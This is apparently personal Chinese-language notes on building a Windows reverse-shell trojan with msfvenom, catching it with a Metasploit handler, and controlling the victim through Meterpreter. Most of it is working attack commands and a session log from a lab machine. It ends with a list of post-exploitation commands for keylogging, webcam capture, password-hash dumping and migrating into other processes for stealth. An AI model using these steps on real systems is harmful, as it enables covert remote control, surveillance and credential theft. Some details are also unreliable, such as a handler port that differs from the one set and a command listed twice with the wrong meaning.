# 反弹shell



# 生成木马

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.127.129 LPORT=4444 -f c -a x86

┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=192.168.127.129 LPORT=4444 -f c  -a x64
//注意x64的payload不能用常规的关闭数据指向保护执行,得分配可执行的内存
```



# 监听

进入`msfconsole` 然后xxx,然后监听

```
┌──(kali㉿kali)-[~]
└─$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.127.129
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.127.129:8888

```

客户端木马运行

然后kali监听成功

```c
┌──(kali㉿kali)-[~]
└─$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.127.129
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.127.129:4444
[*] Sending stage (175686 bytes) to 192.168.127.128
[*] Meterpreter session 1 opened (192.168.127.129:4444 -> 192.168.127.128:50044) at 2023-12-17 04:31:45 -0500

meterpreter > pwd
C:\Users\D0g3\Desktop
meterpreter > sysinfo
Computer        : DESKTOP-FNOV5IM
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter >
```

# 可以输入的参数

```c
以下是一些常见的Meterpreter shell中可执行的指令：

sysinfo：显示目标系统的基本信息，如操作系统、计算机名称、处理器等。

getuid：显示当前用户的权限和标识。

shell：打开一个交互式命令行shell，允许直接在目标系统上执行命令。

getuid：列出当前正在运行的进程。

migrate：将Meterpreter shell迁移到其他进程，以提高持久性和隐蔽性。

download：从目标系统下载文件到攻击者机器。

upload：将文件从攻击者机器上传到目标系统。

execute：在目标系统上执行命令或程序。

keyscan_start和 keyscan_dump：捕获和导出目标系统上的按键记录。

screenshot：捕获目标系统的屏幕截图。

webcam_list和 webcam_snap：列出和捕获目标系统上的摄像头图像。

portfwd：在目标系统上设置端口转发。

hashdump：导出目标系统上的密码哈希。
```